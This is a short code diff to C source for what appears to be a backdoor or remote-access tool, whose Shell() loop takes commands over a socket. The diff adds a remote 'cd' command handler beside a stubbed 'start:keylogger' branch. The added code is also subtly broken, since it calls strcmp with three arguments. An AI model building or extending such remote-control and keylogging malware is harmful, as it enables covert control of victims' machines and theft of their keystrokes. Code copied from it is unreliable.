@@ -1,4 +1,5 @@
 #include "status.h"
+#include "str_cut.h"
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
@@ -42,6 +43,19 @@ void Shell()
     else if (strncmp("start:keylogger", buffer, 15) == 0)
     {
       info("Starting Keylogger..");
+
+      // IMPLEMENT KEYLOGGER
+    }
+    else if (strcmp("cd ", buffer, 3) == 0)
+    {
+      // Get the directory from the original buffer
+      char *str = str_cut(buffer, 3, 100);
+
+      // Change directory
+      chdir(str);
+
+      // Send response
+      send(sock, "Directory changed.", sizeof("Directory changed."), 0);
     }
     else
     {
